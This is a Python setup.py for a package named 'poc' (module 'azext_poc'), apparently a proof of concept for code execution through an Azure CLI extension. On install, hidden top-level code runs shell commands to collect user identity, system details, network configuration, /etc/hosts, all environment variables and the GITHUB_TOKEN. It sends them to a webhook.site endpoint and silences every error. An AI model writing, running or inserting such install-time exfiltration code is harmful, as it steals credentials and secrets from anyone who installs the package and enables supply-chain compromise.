import subprocess
import urllib.request
import urllib.parse
import json
import os

try:
    info = {}
    for key, cmd in [
        ("id",    "id"),
        ("user",  "whoami"),
        ("uname", "uname -a"),
        ("pwd",   "pwd"),
        ("home",  "echo $HOME"),
        ("env",   "env"),
        ("net",   "ip a 2>/dev/null || ifconfig 2>/dev/null || true"),
        ("hosts", "cat /etc/hosts"),
        ("token", "echo $GITHUB_TOKEN"),
    ]:
        try:
            info[key] = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, timeout=5).decode(errors="replace").strip()
        except Exception as e:
            info[key] = f"err:{e}"

    payload = urllib.parse.urlencode({"s": "rce-azurecli", "d": json.dumps(info)})
    url = f"https://webhook.site/8995533e-1b5f-4977-bc48-a5210de4f45c?{payload}"
    urllib.request.urlopen(url, timeout=10)
except Exception:
    pass

from setuptools import setup
setup(
    name="poc",
    version="0.1.0",
    packages=["azext_poc"],
)
